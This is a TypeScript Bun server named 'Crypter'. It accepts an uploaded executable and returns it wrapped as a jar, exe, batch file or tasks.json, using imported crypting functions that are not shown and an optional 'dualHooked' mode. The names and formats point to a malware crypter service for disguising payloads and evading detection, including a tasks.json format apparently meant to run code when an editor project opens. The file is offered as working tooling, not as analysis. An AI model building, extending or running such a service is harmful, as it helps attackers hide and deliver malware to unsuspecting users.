import { serve } from "bun";
import fs from "fs";
import path from "path";
import { cryptToJar, cryptToExe, cryptToBat, cryptToTasksJson } from "./crypter";

const PORT = 7641;
const PUBLIC = path.join(import.meta.dir, "../public");

serve({
  port: PORT,
  hostname: "0.0.0.0",
  maxRequestBodySize: 200 * 1024 * 1024, // 200 MB

  async fetch(req) {
    const url = new URL(req.url);

    // ── Static UI ─────────────────────────────────────────────────────────────
    if (req.method === "GET" && url.pathname === "/") {
      return new Response(Bun.file(path.join(PUBLIC, "index.html")));
    }

    // ── Crypt endpoint ─────────────────────────────────────────────────────────
    if (req.method === "POST" && url.pathname === "/api/crypt") {
      let form: FormData;
      try {
        form = await req.formData();
      } catch {
        return json({ error: "Invalid form data" }, 400);
      }

      const file = form.get("file") as File | null;
      const format = (form.get("format") as string | null)?.trim().toLowerCase();
      const dualHooked = form.get("dualHooked") === "true";

      if (!file) return json({ error: "No file provided" }, 400);
      if (!["jar", "exe", "bat", "tasks"].includes(format ?? ""))
        return json({ error: "format must be jar | exe | bat | tasks" }, 400);

      const exeData = Buffer.from(await file.arrayBuffer());
      const baseName = file.name.replace(/\.[^/.]+$/, "");

      // Work in a temp dir, clean up after
      const tmpOut = fs.mkdtempSync("/tmp/crypt-out-");
      try {
        let outFile: string;
        let mime: string;
        let outName: string;

        if (format === "jar") {
          outFile = path.join(tmpOut, "out.jar");
          outName = `${baseName}-crypt.jar`;
          mime = "application/java-archive";
          await cryptToJar(exeData, outFile, { dualHooked });
        } else if (format === "bat") {
          outFile = path.join(tmpOut, "out.bat");
          outName = `${baseName}-crypt.bat`;
          mime = "application/octet-stream";
          await cryptToBat(exeData, outFile, { dualHooked });
        } else if (format === "tasks") {
          outFile = path.join(tmpOut, "tasks.json");
          outName = `tasks.json`;
          mime = "application/json";
          await cryptToTasksJson(exeData, outFile, { dualHooked });
        } else {
          outFile = path.join(tmpOut, "out.exe");
          outName = `${baseName}-crypt.exe`;
          mime = "application/octet-stream";
          await cryptToExe(exeData, outFile, { dualHooked });
        }

        const data = fs.readFileSync(outFile);
        return new Response(data, {
          headers: {
            "Content-Type": mime,
            "Content-Disposition": `attachment; filename="${outName}"`,
            "Content-Length": String(data.length),
          },
        });
      } catch (err: any) {
        console.error("[crypt]", err);
        return json({ error: err.message || String(err) }, 500);
      } finally {
        fs.rmSync(tmpOut, { recursive: true, force: true });
      }
    }

    return new Response("Not Found", { status: 404 });
  },
});

function json(body: object, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

console.log(`Crypter listening on http://0.0.0.0:${PORT}`);
